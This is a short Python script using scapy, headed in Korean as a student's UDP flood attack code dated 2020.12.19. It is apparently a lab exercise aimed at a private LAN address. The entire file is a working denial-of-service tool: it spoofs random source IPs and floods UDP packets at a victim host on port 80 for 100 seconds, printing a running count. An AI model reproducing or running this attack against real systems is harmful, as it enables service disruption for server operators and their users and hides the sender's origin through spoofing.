#--------------------------------------------------------------------------------------------------------------------------------------------------------------


#                                                               2020.12.19


#                                                   정 재 훈 학 생 UDP Flood 공 격 문 작 성



from scapy.all import *

VICTIM_SERVER_IP="192.168.219.102"
PORT_NUMBER = 80

duration = 100

timeout = time.time() + duration
sent = 0

while True:
    if time.time() > timeout:
        break
    else:
        pass
    _ip = IP(src=RandIP(), dst=VICTIM_SERVER_IP)
    _udp = UDP(sport=RandShort(), dport=PORT_NUMBER)
    send(_ip/_udp, verbose=0)
    sent += 1
    print("UDP_Flooding_Attack Start: " + str(sent) + " sent packages " + VICTIM_SERVER_IP + " At the Port " + str(PORT_NUMBER))






#--------------------------------------------------------------------------------------------------------------------------------------------------------------
